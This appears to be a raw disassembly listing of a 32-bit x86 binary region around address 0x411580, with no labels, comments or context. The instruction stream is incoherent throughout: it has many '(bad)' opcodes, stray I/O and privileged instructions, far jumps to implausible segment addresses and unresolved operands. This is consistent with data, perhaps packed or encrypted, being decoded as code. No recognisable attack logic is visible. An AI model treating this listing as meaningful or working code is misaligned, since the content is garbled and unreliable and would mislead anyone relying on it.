  411580:	jnp    0x4115b9
  411582:	mov    al,0xea
  411584:	int3   
  411585:	xchg   esp,eax
  411586:	push   esi
  411587:	rcl    BYTE PTR [edi+0x740bd4bf],1
  41158d:	in     eax,0x19
  41158f:	push   edi
  411590:	pop    edx
  411591:	or     eax,0x6ba5
	...
  4115a6:	add    BYTE PTR [eax],al
  4115a8:	push   cs
  4115a9:	inc    ecx
  4115aa:	das    
  4115ab:	add    ebx,DWORD PTR [ebx-0x7095f6e8]
  4115b1:	xchg   esp,eax
  4115b2:	or     BYTE PTR [edx+0x54],ch
  4115b5:	mov    bl,0x8
  4115b7:	popf   
  4115b8:	push   esp
  4115b9:	mov    esi,0x48c2057b
  4115be:	clc    
  4115bf:	add    DWORD PTR [edx+0x57],ecx
  4115c2:	cmc    
  4115c3:	push   cs
  4115c4:	xchg   ah,dl
  4115c6:	jl     0x41155f
  4115c8:	pop    eax
  4115c9:	xor    ah,ch
  4115cb:	xchg   ebx,eax
  4115cc:	(bad)  
  4115cd:	adc    DWORD PTR [ebp+ecx*1+0x3f],ecx
  4115d1:	mov    esi,0x9266f97b
  4115d6:	addr16 out 0x59,al
  4115d9:	mov    cl,al
  4115db:	push   ebp
  4115dc:	daa    
  4115dd:	adc    dh,BYTE PTR [ecx+edx*8-0x78]
  4115e1:	dec    eax
  4115e2:	pop    ecx
  4115e3:	push   0xffffffc3
  4115e5:	ret    0x3d08
  4115e8:	retf   
  4115e9:	adc    DWORD PTR [ecx+edi*4-0x70],esi
  4115ed:	dec    eax
  4115ee:	dec    ebp
  4115ef:	inc    ecx
  4115f0:	mov    BYTE PTR [ebp+eiz*8+0x1848616f],dl
  4115f7:	xchg   ecx,eax
  4115f8:	mov    esp,0x419ef582
  4115fd:	dec    eax
  4115fe:	lock xchg esi,eax
  411600:	ror    DWORD PTR [esi-0x4083fd20],cl
  411606:	cmc    
  411607:	xchg   bl,al
  411609:	ret    0xf4f5
	...
  411620:	jg     0x4115d8
  411622:	push   0xf5bed8bd
  411627:	hlt    
  411628:	fstp   TBYTE PTR [esi+0x48d9597b]
  41162e:	sbb    BYTE PTR [ecx-0x76],dl
  411631:	mov    ch,dh
  411633:	push   esi
  411634:	mov    ecx,0x4b4ee448
  411639:	mov    fs,eax
  41163b:	add    BYTE PTR [edx],ah
  41163d:	mov    ?,ebp
  41163f:	dec    DWORD PTR [edx+0xffedcd]
  411645:	ret    0x3ced
  411648:	inc    ecx
  411649:	imul   esi,esi,0xed5a10ff
  41164f:	and    DWORD PTR [edx+0x69],eax
  411652:	idiv   bh
  411654:	add    BYTE PTR [esi-0x13],cl
  411657:	sbb    DWORD PTR [edx+0x69],eax
  41165a:	idiv   bh
  41165c:	nop
  41165d:	popa   
  41165e:	in     eax,dx
  41165f:	adc    DWORD PTR [edx+0x69],eax
  411662:	idiv   bh
  411664:	xor    BYTE PTR ds:0x694209ed,0xf6
  41166b:	call   DWORD PTR [eax+0x30]
  41166e:	in     eax,dx
  41166f:	add    DWORD PTR [edx+0x40fff667],eax
  411675:	pop    esp
  411676:	in     eax,dx
  411677:	and    eax,0xc9089886
  41167c:	daa    
  41167d:	xchg   esi,eax
  41167e:	or     BYTE PTR [ebp+0x3e],dl
  411681:	xor    eax,0xc488
	...
  411696:	add    BYTE PTR [eax],al
  411698:	int    0x50
  41169a:	idiv   bh
  41169c:	pop    eax
  41169d:	(bad)  
  41169e:	icebp  
  41169f:	push   eax
  4116a0:	jmp    0xe090:0x80ff01ce
  4116a7:	(bad)  
  4116a9:	xchg   ecx,eax
  4116aa:	or     BYTE PTR [ebx],cl
  4116ac:	in     eax,0x98
  4116ae:	mov    esp,DWORD PTR [ebp-0x38f76e5b]
  4116b4:	mov    al,0x60
  4116b6:	cmc    
  4116b7:	push   DWORD PTR [ebp-0x6f]
  4116ba:	int    0x45
  4116bc:	add    DWORD PTR [ecx+0xe],ebp
  4116bf:	add    BYTE PTR [ebp-0x55],ah
  4116c2:	cmc    
  4116c3:	imul   esi,DWORD PTR [ebp+0x16],0x5e8cec8d
  4116ca:	pop    esp
  4116cb:	(bad)  
  4116cc:	mov    esp,0xc98d09d1
  4116d1:	jg     0x41168c
  4116d3:	mov    WORD PTR [ecx],ss
  4116d5:	xchg   DWORD PTR [esi+edi*8+0x43],eax
  4116d9:	sbb    ebx,DWORD PTR [ebp+0x74]
  4116dc:	xor    al,0x6e
  4116de:	(bad)  
  4116df:	sti    
  4116e0:	and    al,0x71
  4116e2:	daa    
  4116e3:	add    BYTE PTR [edx+eax*8-0x6d718cb7],cl
  4116ea:	rol    DWORD PTR [edx-0x1be4127],cl
  4116f0:	adc    ebp,DWORD PTR [ebp+eax*8+0x51f80b04]
  4116f7:	jmp    0x0:0xe77637ce
	...
  41170e:	add    BYTE PTR [eax],al
  411710:	add    ebp,DWORD PTR [esi+0x30014f59]
  411716:	push   eax
  411717:	imul   bl
  411719:	fnstsw WORD PTR [esi+edi*8+0x745ab759]
  411720:	test   bl,dl
  411722:	mov    DWORD PTR [eax],edi
  411724:	rcl    ebp,cl
  411726:	cmc    
  411727:	mov    edi,0x8474ba40
  41172c:	mov    esp,0x24fe59fd
  411731:	mov    ds:0xf68c40d5,eax
  411736:	(bad)  
  411737:	out    dx,eax
  411738:	mov    ds:0xbde75a1d,eax
  41173d:	enter  0x9,0x87
  411741:	jmp    0x411713
  411743:	or     eax,0xf65c7f93
  411748:	mov    edi,DWORD PTR [ebx]
  41174a:	pop    ecx
  41174b:	je     0x4116e9
  41174d:	adc    eax,0x2b7bfb31
  411752:	pop    ecx
  411753:	mov    ah,0x7c
  411755:	xchg   ebp,eax
  411756:	push   esi
  411757:	push   ebx
  411758:	push   0xffffffad
  41175a:	lahf   
  41175b:	sbb    DWORD PTR [ebx-0x44],esp
  41175e:	pop    esi
  41175f:	leave  
  411760:	arpl   WORD PTR [esi-0x43adad37],bp
  411766:	dec    esi
  411767:	fld    DWORD PTR [edi-0x53]
  41176a:	xchg   ebx,eax
  41176b:	and    eax,0x4628948c
  411770:	xchg   DWORD PTR [esp+ebx*4+0x7e],edx
	...
  411787:	add    BYTE PTR [edi],ah
  411789:	sbb    BYTE PTR [eax+edx*2],ah
  41178c:	mov    ch,0x94
  41178e:	cdq    
  41178f:	mov    dh,0x22
  411791:	inc    edx
  411792:	out    0x5b,eax
  411794:	mov    ebp,0x4530687
  411799:	push   edx
  41179a:	or     edx,DWORD PTR [ebx-0x80]
  41179d:	mov    WORD PTR [edi-0x20aa8a97],ss
  4117a3:	push   edx
  4117a4:	rcr    ah,0xa7
  4117a7:	(bad)  
  4117a8:	repz mov bl,0xa5
  4117ab:	push   eax
  4117ac:	jmp    0xc52c:0x8bd8d6bb
  4117b3:	fisttp QWORD PTR [esp+edx*4+0x47]
  4117b7:	push   es
  4117b8:	mov    WORD PTR [edi+ebx*2-0x494600a5],ss
  4117bf:	push   edx
  4117c0:	ret    0xe741
  4117c3:	fisttp DWORD PTR [eax-0x4cfbdfd1]
  4117c9:	add    edi,0x97944cbb
  4117cf:	pop    ebp
  4117d0:	mov    eax,ds:0x20529ebb
  4117d5:	mov    WORD PTR [edi],es
  4117d7:	add    DWORD PTR [edi],esp
  4117d9:	push   ebp
  4117da:	(bad)  
  4117dc:	lea    edx,[edi+ebx*8+0x8dc6b83]
  4117e3:	ja     0x4117c3
  4117e5:	mov    edx,0xbac3f4f5
  4117ea:	jnp    0x4117dd
	...
  411800:	(bad)  
  411801:	jnp    0x41183c
  411803:	pop    esi
  411804:	mov    esi,0x8fedcacc
  411809:	popa   
  41180a:	cmp    DWORD PTR ds:0xd3f4d70a,0x3e5c2e8f
  411814:	fs xchg ebx,eax
  411816:	loopne 0x411865
  411818:	mov    eax,ds:0x4460f5bb
  41181d:	mov    edi,0x544a9060
  411822:	or     BYTE PTR [esi],bl
  411824:	inc    esp
  411825:	xchg   ebx,eax
  411826:	loopne 0x4117b5
  411828:	imul   edi,DWORD PTR [edx-0x40cbf10b],0xfffffff5
  41182f:	jl     0x411838
  411831:	mov    bl,0x5
  411833:	mov    edx,0x2bbfba5e
  411838:	xchg   ebx,eax
  411839:	xchg   esp,eax
  41183a:	pop    ebx
  41183b:	bound  edx,QWORD PTR [ebx+0x16]
  41183e:	int    0xe5
  411840:	bound  esp,QWORD PTR es:[edx-0x17]
  411844:	rcr    DWORD PTR [edi-0xb],0x5c
  411848:	fdiv   DWORD PTR [edx-0x45c2e449]
  41184e:	jg     0x41187c
  411850:	pop    esp
  411851:	push   cs
  411852:	cmp    al,0x1d
  411854:	add    BYTE PTR [eax+ecx*1+0x62],dl
  411858:	mov    esi,DWORD PTR [eax+eax*2]
  41185b:	sub    BYTE PTR [eax-0x3c16c9ec],cl
  411861:	dec    edi
  411862:	pusha  
  411863:	sbb    BYTE PTR [eax],al
	...
  411875:	add    BYTE PTR [eax],al
  411877:	add    cl,al
  411879:	push   ebx
  41187a:	or     BYTE PTR [esi],bh
  41187c:	cmp    cl,cl
  41187e:	daa    
  41187f:	jmp    0x109a813
  411884:	mov    ebp,eax
  411886:	pop    ebx
  411887:	call   0x36bde3
  41188c:	xchg   ebp,eax
  41188d:	fdiv   st,st(5)
  41188f:	push   edx
  411891:	outs   dx,BYTE PTR es:[esi]
  411893:	js     0x4118d3
  411895:	xlat   BYTE PTR ds:[ebx]
  411896:	cmc    
  411897:	dec    edi
  411898:	ret    0xde1
  41189b:	call   0x381f33
  4118a0:	int    0x9b
  4118a2:	cmp    edi,edi
  4118a4:	rcl    BYTE PTR [edi+0x8],cl
  4118a7:	inc    esi
  4118a8:	mov    ch,0xa6
  4118aa:	or     BYTE PTR [ebp+0x7f],dh
  4118ad:	into   
  4118ae:	icebp  
  4118af:	xor    esp,DWORD PTR [ebp+0xd]
  4118b2:	idiv   edi
  4118b4:	jb     0x411919
  4118b6:	imul   DWORD PTR [esi-0x448472d3]
  4118bc:	and    cl,0xf1
  4118bf:	(bad)  
  4118c0:	clc    
  4118c1:	mov    ebp,0x654793ed
  4118c6:	neg    BYTE PTR [edi+0x23]
  4118c9:	jg     0x411892
  4118cb:	add    al,0xe5
  4118cd:	add    al,BYTE PTR [ebx-0x2b39914]
  4118d3:	xor    DWORD PTR [eax-0xabebdb2],0xffffff95
  4118da:	jnp    0x4118e0
	...
  4118f0:	sub    al,0x50
  4118f2:	or     eax,0x7914d00
  4118f7:	add    BYTE PTR [ebp+0x235005d],dh
  4118fd:	add    BYTE PTR gs:[ebp+0x1],0x4d
  411902:	dec    esp
  411903:	clc    
  411904:	test   eax,0x20000896
  411909:	sar    ch,cl
  41190b:	push   eax
  41190c:	add    ah,bl
  41190e:	icebp  
  41190f:	dec    DWORD PTR [eax+ebx*4-0x28e600f8]
  411916:	pop    eax
  411917:	adc    al,0x52
  411919:	xchg   cl,cl
  41191b:	inc    DWORD PTR [edx+0x2fe745c0]
  411921:	loop   0x41192c
  411923:	add    BYTE PTR [edi],cl
  411925:	inc    ebx
  411926:	or     al,0x76
  411928:	and    ebx,0x19730009
  41192e:	rol    BYTE PTR [ebx-0xf61319],cl
  411934:	fld    DWORD PTR [edi+0x58]
  411937:	je     0x4118cd
  411939:	arpl   WORD PTR [esi+0x587a435c],bp
  41193f:	je     0x411979
  411941:	push   ebx
  411942:	xchg   esp,eax
  411943:	xor    esi,DWORD PTR [ebx]
  411945:	push   0x32
  411947:	rcl    DWORD PTR [ebx+ebp*4+0x2e308abe],0x4d
  41194f:	sti    
  411950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411951:	stos   DWORD PTR es:[edi],eax
  411952:	rcl    DWORD PTR [ebp+0x0],cl
	...
  411965:	add    BYTE PTR [eax],al
  411967:	add    BYTE PTR [ebx],dl
  411969:	and    dl,dh
  41196b:	out    0xd9,eax
  41196d:	sti    
  41196e:	pop    eax
  41196f:	(bad)  
  411970:	adc    eax,0x56745f0
  411975:	push   ss
  411976:	retf   
  411977:	push   edx
  411979:	aas    
  41197a:	icebp  
  41197b:	out    0x62,eax
  41197d:	mov    dl,0x45
  41197f:	(bad)  
  411980:	jecxz  0x4119e1
  411982:	pop    eax
  411983:	(bad)  
  411984:	popa   
  411985:	mov    bl,0x51
  411987:	neg    DWORD PTR [ebp-0x3137ba36]
  41198d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41198e:	or     DWORD PTR [ebp+0x17],edx
  411991:	(bad)  
  411992:	mov    ebx,eax
  411994:	mov    eax,0x5b6a0c54
  411999:	jmp    0x158b:0x93b407cf
  4119a0:	mov    ds:0x97c978b8,eax
  4119a5:	sub    ebx,edi
  4119a7:	add    esp,DWORD PTR [ebx-0x96bf807]
  4119ad:	push   ebp
  4119ae:	(bad)  
  4119b0:	inc    esi
  4119b1:	sub    al,0x20
  4119b3:	add    al,0x7b
  4119b5:	inc    edx
  4119b6:	out    0x5b,eax
  4119b8:	or     bl,BYTE PTR [edx+0x66]
  4119bb:	dec    edi
  4119bc:	push   0x42
  4119be:	imul   ecx,DWORD PTR [edi-0x28],0xffffff8c
  4119c2:	push   edi
  4119c3:	xchg   ecx,eax
  4119c4:	pushf  
  4119c5:	mov    bh,0x5e
  4119c7:	cmp    eax,0xb8df914d
	...
  4119e0:	push   ss
  4119e1:	test   eax,0x5f5f4862
  4119e6:	sahf   
  4119e7:	dec    esi
  4119e8:	ror    BYTE PTR [eax-0x488b03b9],0x26
  4119ef:	sti    
  4119f0:	jmp    0x411a33
  4119f2:	in     eax,0xae
  4119f4:	ror    ebp,0x21
  4119f7:	cld    
  4119f8:	sbb    ecx,DWORD PTR [ecx]
  4119fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119fb:	push   ebx
  4119fc:	ret    
  4119fd:	mov    bh,0x9c
  4119ff:	push   ebx
  411a01:	std    
  411a02:	enter  0x24e,0x8c
  411a06:	pop    ds
  411a07:	dec    DWORD PTR [edi]
  411a09:	pop    esp
  411a0a:	loopne 0x411a0f
  411a0c:	mov    WORD PTR [edi+0x521a4f7c],?
  411a12:	retf   
  411a13:	xor    al,0x70
  411a15:	fcom   st(6)
  411a17:	fdiv   DWORD PTR [edi-0x14b3ab49]
  411a1d:	(bad)  
  411a1e:	and    cl,BYTE PTR [edi-0x36]
  411a21:	mov    ebx,DWORD PTR [edi+0x2d0d8ad7]
  411a27:	pusha  
  411a28:	push   es
  411a29:	lds    ecx,FWORD PTR [eax]
  411a2b:	ret    0xb6a3
  411a2e:	jnp    0x4119dd
  411a30:	inc    edi
  411a31:	mov    eax,0xc52a639
  411a36:	dec    esp
  411a37:	lea    ecx,[edx+0x40]
  411a3a:	hlt    
  411a3b:	xchg   esi,eax
  411a3c:	mov    ah,0xab
  411a3e:	cmc    
  411a3f:	adc    al,0xd8
  411a41:	scas   eax,DWORD PTR es:[edi]
  411a42:	sub    DWORD PTR [ebp+0x0],edi
	...
  411a58:	shl    BYTE PTR [esi-0x53240b7f],cl
  411a5e:	call   0xb5d5aa4c
  411a63:	jge    0x411aab
  411a65:	push   esp
  411a66:	or     BYTE PTR [esi+0x94daf19],bh
  411a6c:	nop
  411a6d:	xchg   esp,eax
  411a6e:	add    DWORD PTR [ecx],ebp
  411a70:	cmp    edx,DWORD PTR [ebp-0x7d24051f]
  411a76:	enter  0xd280,0xb6
  411a7a:	cmc    
  411a7b:	ds fucomp st(1)
  411a7e:	xor    dh,ch
  411a80:	push   esp
  411a81:	mov    al,0xdf
  411a83:	and    DWORD PTR [edi-0x408df76c],ecx
  411a89:	das    
  411a8a:	in     eax,dx
  411a8b:	xchg   edx,eax
  411a8c:	push   eax
  411a8d:	mov    bh,0x5b
  411a8f:	add    DWORD PTR [edx],edx
  411a91:	xchg   edi,eax
  411a92:	or     cl,ch
  411a94:	push   es
  411a95:	idiv   DWORD PTR [ebx-0x14]
  411a98:	pusha  
  411a99:	add    eax,0x548fe909
  411a9e:	cmp    ecx,0x81e04077
  411aa4:	dec    eax
  411aa5:	sub    al,BYTE PTR [edi-0x17]
  411aa8:	sbb    DWORD PTR [edi-0x6b6ff6f3],ebp
  411aae:	add    DWORD PTR [ecx+0x71df8fbb],ebp
  411ab4:	nop
  411ab5:	xchg   esp,eax
  411ab6:	or     BYTE PTR [eax],al
  411ab8:	aas    
  411ab9:	ror    bl,0x0
	...
  411ad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ad1:	add    bl,BYTE PTR [eax-0x1]
  411ad4:	jo     0x411b2e
  411ad6:	in     eax,dx
  411ad7:	aas    
  411ad8:	fist   DWORD PTR [edx-0x240af4f8]
  411ade:	jns    0x411a69
  411ae0:	jo     0x411b0e
  411ae2:	div    BYTE PTR [ebp+0xd]
  411ae5:	pop    eax
  411ae6:	adc    eax,DWORD PTR [ebx+0x1a]
  411ae9:	dec    eax
  411aea:	add    BYTE PTR [ebp+0x15],0x48
  411aee:	jl     0x411ad4
  411af0:	cli    
  411af1:	fst    st(5)
  411af3:	call   0x37e95d
  411af8:	outs   dx,BYTE PTR ds:[esi]
  411af9:	push   edx
  411afa:	jns    0x411b4b
  411afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411afd:	aad    0xe9
  411aff:	inc    DWORD PTR [eax+0x65416267]
  411b05:	cmp    DWORD PTR [eax+ebx*8-0x26],ecx
  411b09:	popf   
  411b0a:	jmp    0x85d30f7a
  411b0f:	inc    ebp
  411b10:	mov    eax,ds:0x15d44c35
  411b15:	aaa    
  411b16:	dec    esp
  411b17:	in     al,0x5
  411b19:	dec    ecx
  411b1a:	jl     0x411afc
  411b1c:	jge    0x411b0e
  411b1e:	push   ecx
  411b1f:	(bad)  
  411b20:	jp     0x411add
  411b22:	mov    ch,0x74
  411b24:	inc    ebx
  411b25:	fimul  DWORD PTR [eax]
  411b27:	add    BYTE PTR [edx],cl
  411b29:	or     bh,dh
  411b2b:	jne    0x411b2a
  411b2d:	pop    ecx
  411b2e:	retf   0xfa2f
  411b31:	dec    eax
  411b32:	div    BYTE PTR [ebp+0x0]
	...
  411b45:	add    BYTE PTR [eax],al
  411b47:	add    BYTE PTR [ebp-0x72f783b9],cl
  411b4d:	stos   BYTE PTR es:[edi],al
  411b4e:	and    eax,0x7c48eaff
  411b53:	in     al,0xba
  411b55:	(bad)  
  411b57:	dec    DWORD PTR [eax+ebx*2-0x4953180c]
  411b5e:	inc    esp
  411b5f:	inc    bl
  411b61:	js     0x411bcf
  411b63:	out    0xbd,eax
  411b65:	mov    ecx,0xa356fe44
  411b6a:	je     0x411b7b
  411b6c:	xchg   edi,eax
  411b6d:	std    
  411b6e:	fisttp QWORD PTR [eax]
  411b70:	or     al,0xae
  411b72:	or     DWORD PTR [edi],ecx
  411b74:	adc    DWORD PTR [ebx-0x6c6c01bc],edi
  411b7a:	or     al,BYTE PTR [eax]
  411b7c:	jnp    0x411bc3
  411b7e:	inc    esp
  411b7f:	je     0x411b15
  411b81:	and    ecx,DWORD PTR [esi+0x44367b2e]
  411b87:	je     0x411bf9
  411b89:	ds fdivrp st(7),st
  411b8c:	imul   eax,eax,0xfffffff1
  411b8f:	out    0x30,eax
  411b91:	sahf   
  411b92:	inc    ebx
  411b93:	(bad)  
  411b94:	pop    ebx
  411b95:	loopne 0x411bec
  411b97:	out    0x11,eax
  411b99:	cdq    
  411b9a:	inc    ebx
  411b9b:	(bad)  
  411b9c:	sbb    eax,esi
  411b9e:	pop    ecx
  411b9f:	dec    edi
  411ba0:	xor    al,0x5f
  411ba2:	add    edi,edi
  411ba4:	cmp    esp,DWORD PTR [edx+0x9]
  411ba7:	pop    edi
  411ba8:	shl    BYTE PTR [edi+eax*2+0x7],cl
	...
  411bc0:	mov    WORD PTR [eax],fs
  411bc2:	jno    0x411baf
  411bc4:	and    ebx,DWORD PTR [eax]
  411bc6:	idiv   dh
  411bc8:	mov    eax,ds:0x126251c3
  411bcd:	sahf   
  411bce:	inc    esp
  411bcf:	enter  0xd6ce,0x9
  411bd3:	push   ebp
  411bd4:	pop    ss
  411bd5:	lahf   
  411bd6:	inc    esp
  411bd7:	je     0x411b61
  411bd9:	mov    ds:0xbdf3356c,eax
  411bde:	std    
  411bdf:	mov    edi,0x7444ca60
  411be4:	jl     0x411b7a
  411be6:	das    
  411be7:	pop    esp
  411be8:	pusha  
  411be9:	jle    0x411bc1
  411beb:	dec    ebx
  411bec:	inc    ebx
  411bed:	sub    al,0xd3
  411bef:	popa   
  411bf0:	mov    edx,DWORD PTR [esi+eax*8+0x34b59bd1]
  411bf7:	lock dec ebx
  411bf9:	mov    ch,0x3c
  411bfb:	cld    
  411bfc:	stos   DWORD PTR es:[edi],eax
  411bfd:	call   FWORD PTR [eax]
  411bff:	dec    ebx
  411c00:	stos   BYTE PTR es:[edi],al
  411c01:	stos   DWORD PTR es:[edi],eax
  411c02:	inc    edi
  411c03:	push   ss
  411c04:	mov    ds:0x7f46b8b4,eax
  411c09:	xchg   esp,eax
  411c0a:	cmp    al,0x7f
  411c0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c0d:	sub    ebx,edi
  411c0f:	add    edi,DWORD PTR [ebx-0xd]
  411c12:	pop    es
  411c13:	cmp    esi,esi
  411c15:	push   ebp
  411c16:	fisttp WORD PTR [edx+0x0]
  411c19:	mov    eax,ds:0x2a72ee19
  411c1e:	out    0x5b,eax
  411c20:	cmp    esi,DWORD PTR [esi+eiz*2+0x4b]
	...
  411c37:	add    bl,ch
  411c39:	xchg   esp,eax
  411c3a:	fistp  WORD PTR [edx+0x19]
  411c3d:	cmp    eax,0x94ccdf26
  411c42:	pop    esi
  411c43:	rcl    DWORD PTR [edi-0x47b51cc2],1
  411c49:	pushf  
  411c4a:	push   edi
  411c4b:	ins    DWORD PTR es:[edi],dx
  411c4c:	cmp    dh,BYTE PTR [esi+esi*1+0x4eb433dc]
  411c53:	mov    dh,BYTE PTR [ebx+0x23c4cae3]
  411c59:	mov    bl,0x94
  411c5b:	mul    DWORD PTR [ebp-0x742ee989]
  411c61:	mov    esp,0xb40a4b61
  411c66:	sub    BYTE PTR [esi-0x75],al
  411c69:	xchg   esp,eax
  411c6a:	xchg   esp,eax
  411c6b:	jle    0x411c54
  411c6d:	cmp    al,0x2
  411c6f:	fisttp WORD PTR [esp+edx*4+0x8]
  411c73:	cmp    DWORD PTR [ecx+0x56e9473e],0x7ce61828
  411c7d:	int3   
  411c7e:	inc    eax
  411c7f:	sub    BYTE PTR [eax+0x571c1bbc],cl
  411c85:	mov    dl,0x1
  411c87:	test   eax,0xa6a98ed3
  411c8c:	ficom  DWORD PTR [eax+ecx*1-0x42]
  411c90:	fcomp  QWORD PTR [edi-0x4457c30b]
  411c96:	mov    ebp,DWORD PTR [esi-0x230a4daa]
	...
  411cb0:	ds inc di
  411cb3:	jmp    0x9678edef
  411cb8:	(bad)  
  411cb9:	fmul   st(2),st
  411cbb:	fisttp QWORD PTR [edi+0x12958149]
  411cc1:	xlat   BYTE PTR ds:[ebx]
  411cc2:	hlt    
  411cc3:	adc    ecx,DWORD PTR [eax+0x3c764f3e]
  411cc9:	fwait
  411cca:	loopne 0x411cb5
  411ccc:	xchg   BYTE PTR [ebx-0x50b38f0b],dh
  411cd2:	pusha  
  411cd3:	scas   eax,DWORD PTR es:[edi]
  411cd4:	cmp    edx,DWORD PTR [eax+ecx*1-0x3f]
  411cd8:	mov    al,ds:0xd6e94740
  411cdd:	sub    BYTE PTR [eax],al
  411cdf:	push   ecx
  411ce0:	stos   BYTE PTR es:[edi],al
  411ce1:	mov    dl,0xf5
  411ce3:	ds (bad) 
  411ce5:	sub    ah,dh
  411ce7:	ss cmp al,0x9b
  411cea:	loopne 0x411cf3
  411cec:	xchg   DWORD PTR [ebx-0x682ecf0b],esi
  411cf2:	or     BYTE PTR [edx+edx*4+0x532d89bf],dh
  411cf9:	cmp    eax,0xb2378308
  411cfe:	jnp    0x411d00
  411d00:	std    
  411d01:	dec    esi
  411d02:	mov    edi,0x805cf22e
  411d07:	inc    ebp
  411d08:	loope  0x411cd7
  411d0a:	sub    BYTE PTR [esp+esi*1-0x69],0x60
  411d0f:	jae    0x411d52
  411d11:	xlat   BYTE PTR ds:[ebx]
  411d12:	cmc    
  411d13:	inc    BYTE PTR [eax]
	...
  411d25:	add    BYTE PTR [eax],al
  411d27:	add    BYTE PTR [eax],bh
  411d29:	mov    al,0xed
  411d2b:	gs loop 0x411d8a
  411d2e:	idiv   bh
  411d30:	pop    eax
  411d31:	pop    esp
  411d32:	div    BYTE PTR [ebp-0x43]
  411d35:	dec    esi
  411d36:	in     eax,0x2e
  411d38:	repnz pop esp
  411d3a:	rol    dl,0xb9
  411d3d:	xchg   esi,eax
  411d3e:	pop    ebx
  411d3f:	mov    esp,ecx
  411d41:	sbb    dl,cl
  411d43:	cld    
  411d44:	jg     0x411cde
  411d46:	bound  ebx,QWORD PTR [edx-0xe]
  411d49:	loop   0x411d58
  411d4b:	call   0x36ac59
  411d50:	in     al,dx
  411d51:	icebp  
  411d52:	icebp  
  411d53:	push   0x65
  411d55:	into   
  411d56:	int    0x6c
  411d58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d59:	cwde   
  411d5a:	pusha  
  411d5b:	stos   DWORD PTR es:[edi],eax
  411d5c:	xchg   ecx,eax
  411d5d:	aad    0xf5
  411d5f:	(bad)  
  411d60:	sbb    BYTE PTR [esi+0x4d],bh
  411d63:	inc    ecx
  411d64:	gs dec esi
  411d66:	dec    edi
  411d67:	xor    al,0xb2
  411d69:	pop    ebx
  411d6a:	add    al,al
  411d6c:	imul   edi,DWORD PTR [edi-0x69ca97bb],0x815dbee5
  411d76:	popa   
  411d77:	inc    ecx
  411d78:	and    eax,0x2d75f6e6
  411d7d:	dec    esi
  411d7e:	adc    DWORD PTR [edx+0x72],ebx
  411d81:	pop    ebx
  411d82:	in     eax,dx
  411d83:	and    eax,0x6af65d34
  411d88:	and    eax,0x6ccdce
	...
  411d9d:	add    BYTE PTR [eax],al
  411d9f:	add    BYTE PTR [esp+edi*8+0x30376809],cl
  411da6:	retf   0x73ff
  411da9:	mov    ebp,0x840c0009
  411dae:	daa    
  411daf:	xor    al,0xeb
  411db1:	stos   BYTE PTR es:[edi],al
  411db2:	hlt    
  411db3:	mov    edi,0x67b9c458
  411db8:	mov    WORD PTR [ebx-0x299b42b0],?
  411dbe:	fld    QWORD PTR [eax-0x74]
  411dc1:	imul   edi,DWORD PTR [edi],0x74
  411dc4:	xchg   esp,eax
  411dc5:	rcl    DWORD PTR [edx+0x58],cl
  411dc8:	mov    ebx,0x7cf151da
  411dcd:	repnz inc eax
  411dcf:	imul   ecx,DWORD PTR [ebx+edx*2-0x44b294c4],0x7c28aad1
  411dda:	or     al,0xff
  411ddc:	pop    ecx
  411ddd:	shl    DWORD PTR [ecx+0x5d138c40],cl
  411de3:	xor    al,BYTE PTR [ebx+0xbff522]
  411de9:	mov    ch,0xb9
  411deb:	mov    WORD PTR [bp+di-0x42b0],?
  411df0:	hlt    
  411df1:	push   es
  411df2:	fiadd  WORD PTR [eax-0x74]
  411df5:	mov    edi,DWORD PTR [edi]
  411df7:	je     0x411d7d
  411df9:	inc    ebx
  411dfa:	xchg   BYTE PTR [eax+0x53],bl
  411dfd:	push   edx
  411dfe:	push   ecx
  411dff:	mov    ebp,0x69404a7c
	...
  411e18:	mov    ebx,ss
  411e1a:	cmp    DWORD PTR [ebx-0x33],ebp
  411e1d:	mov    ebx,0xfca0aad1
  411e22:	or     DWORD PTR [eax-0x72],ebp
  411e25:	mov    ebx,0x7b348009
  411e2a:	sbb    al,0xff
  411e2c:	sbb    edx,DWORD PTR [edx+edi*8-0x507460bd]
  411e33:	fisttp DWORD PTR [ebx]
  411e35:	mov    cl,0xe
  411e37:	mov    DWORD PTR [ebx-0x33],ebp
  411e3a:	jae    0x411dfe
  411e3c:	sti    
  411e3d:	pusha  
  411e3e:	push   cs
  411e3f:	into   
  411e40:	mov    edi,DWORD PTR [ecx+eiz*2+0x7b0eaaa]
  411e47:	jl     0x411dfc
  411e49:	mov    cl,0xe6
  411e4b:	inc    edi
  411e4c:	pusha  
  411e4d:	mov    al,0xee
  411e4f:	ror    DWORD PTR [ebx-0x34e62a44],1
  411e55:	mov    al,0xa8
  411e57:	inc    edx
  411e58:	(bad)  
  411e59:	xchg   esp,eax
  411e5a:	cmp    al,0x7b
  411e5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e5d:	adc    ah,BYTE PTR [esp+ebx*2-0x23494f46]
  411e64:	nop
  411e65:	xchg   ebx,eax
  411e66:	fild   WORD PTR [ebx]
  411e68:	mov    ah,0x13
  411e6a:	lock inc esi
  411e6c:	call   0x96b0:0x9a5c651a
  411e73:	jns    0x411e45
  411e75:	mov    al,0x2f
  411e77:	inc    edi
  411e78:	clc    
  411e79:	mov    al,ds:0xd186
	...
  411e8e:	add    BYTE PTR [eax],al
  411e90:	xchg   ebx,eax
  411e91:	mov    esp,0xb073e865
  411e96:	cli    
  411e97:	inc    ebx
  411e98:	call   0xae94:0x8c04eb19
  411e9f:	shl    DWORD PTR [ebx-0x6b],0xdf
  411ea3:	add    ecx,DWORD PTR [edi+edx*8-0x67b5b054]
  411eaa:	fild   WORD PTR [ebx]
  411eac:	mov    dh,0x94
  411eae:	leave  
  411eaf:	add    esp,DWORD PTR [esi+0x103d994]
  411eb5:	pop    edx
  411eb6:	cmp    esi,DWORD PTR [eax+ebx*1-0x2cc2f6e6]
  411ebd:	scas   al,BYTE PTR es:[edi]
  411ebe:	cmc    
  411ebf:	cdq    
  411ec0:	shr    BYTE PTR [eax],cl
  411ec2:	lock es cmp eax,0xf3c1e0ac
  411ec9:	scas   eax,DWORD PTR es:[edi]
  411eca:	cmc    
  411ecb:	loop   0x411f1c
